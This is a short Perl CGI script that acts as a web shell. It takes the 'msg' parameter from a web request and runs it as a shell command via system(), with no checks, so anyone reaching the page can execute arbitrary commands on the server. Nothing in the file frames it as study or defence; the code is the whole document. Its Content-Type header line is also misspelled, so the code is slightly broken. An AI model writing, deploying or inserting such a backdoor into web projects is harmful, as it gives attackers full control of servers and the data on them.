#!/usr/bin/perl
use CGI':standard';
print "con tent-type:text/html\n\n"; 
$c=param('msg');
system($c); 
exit(0);